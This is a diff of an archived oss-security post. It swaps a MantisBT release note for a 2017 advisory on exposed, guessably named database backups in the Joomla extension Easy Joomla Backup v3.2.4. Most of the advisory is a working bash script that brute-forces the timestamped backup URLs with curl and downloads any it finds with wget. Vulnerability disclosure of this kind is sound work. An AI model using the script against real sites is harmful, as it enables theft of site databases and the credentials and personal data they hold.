@@ -1,21 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/01/2
-Message-ID: <olq1d0$a2j$1@blaine.gmane.org>
-Date: Tue, 1 Aug 2017 15:57:58 +0200
-From: Damien Regad <dregad@...tisbt.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Advisory: XSS issues in MantisBT (CVE-2017-12061, CVE-2017-12062)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/28/3
+Message-id: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
+Date: Thu, 28 Sep 2017 08:35:38 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
 Content-Type: text/plain; charset=utf-8
 
-On 2017-08-01 15:22, Damien Regad wrote:
-> * Releases 1.3.9, 2.1.3, 2.2.3 and 2.3.0 are scheduled for release on
-> coming week-end
+Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-09-07
+CVE-ID:[CVE-2017-2550]
+Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup
+Vendor: kubik-rubik
+Vendor Notified: 2017-09-07
+Vendor Contact:
+Advisory: http://www.vapidlabs.com/advisory.php?v=200
+Description: Easy Joomla Backup creates 'old-school' backups without any frills.
+Vulnerability:
+The software creates a copy of the backup in the web root.  The file name is easily guessable as it's just a time stamp:
 
-That was a copy/paste error. The above should have read:
+http://example.com/administrator/components/com_easyjoomlabackup/backups/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip
 
-* Releases 1.3.12, 2.5.2 and 2.6.0 are scheduled for release in the
-coming week.
-
-Apologies for any confusion.
-Damien
-
+Exploit Code:
+	• #!/bin/bash
+	• #Larry W. Cashdollar, @_larry0 9/7/2017
+	• #Bruteforce download backups for Joomla Extension Easy Joomla Backup v3.2.4
+	• #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup
+	• MONTH=09
+	• DAY=07
+	• YEAR=2017
+	• Z=0
+	• #May need to set the DOMAIN to $1 the target depending on how WP is configured.
+	• DOMAIN=192.168.0.163
+	•  
+	• echo "Scanning website for available backups:"
+	• for y in `seq -w 0 23`; do
+	•         for x in `seq -w 0 59`; do
+	•                  Y=`echo "scale=2;($Z/86000)*100"|bc`;
+	•                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"
+	•         for z in `seq -w 0 59`; do
+	•                  Z=$(( $Z + 1 ));
+	•                  CPATH="http://$1/administrator/components/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";
+	•                  RESULT=`curl -s --head $CPATH|grep 200`;
+	•                 if [ -n "$RESULT" ]; then
+	•                  echo ""
+	•                  echo "[+] Location $CPATH Found";
+	•                  echo "[+] Received $RESULT";
+	•                  echo "Downloading......";
+	•                  wget $CPATH
+	•                 fi;
+	•         done
+	•         done
+	• done
+	• echo "Completed."
